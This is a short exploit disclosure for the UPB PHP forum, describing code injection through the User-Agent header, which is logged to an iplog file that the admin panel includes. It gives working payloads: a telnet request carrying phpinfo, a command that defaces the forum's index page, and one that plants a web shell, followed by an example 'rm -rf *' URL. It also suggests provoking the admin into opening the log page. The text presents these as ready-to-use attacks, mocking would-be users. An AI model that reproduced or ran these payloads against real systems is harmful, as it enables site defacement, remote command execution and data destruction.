description
-----------

there is serious vuln, that allow to attacker execute random php
code. the UPB logs some visitor info [ such as REMOTE_ADDR and
HTTP_USER_AGENT ] in text file under `db' directory named `iplog'.
then in admin panel board admin can to call admin_iplog.php, that
just include `iplog'. Thats 0k, but..

e@some_host$ telnet hostname 80
Connected to hostname at 80
GET /board/index.php HTTP/1.0
User-Agent: <? phpinfo(); ?>

when admin call the admin_iplog.php your php code will executed.

examples for kodsweb skids:

1. <? system( "echo \'hacked\' > ../index.html" ); ?>

will deface forum main page

2. <? system( "echo \'<? system( $cmd ); ?>\' > ../../tcsh.php" ); ?>

will create tcsh.php in wwwroot with httpd privileges.
then you just go to <http://hostname/tcsh.php?cmd=rm> -rf *

after inject code through User-Agent field you have wait for admin see
the admin_iplog.php. how to make admin see the iplog?? its quite easy
== just annoy the admin, use the swearing in board messages, etc.
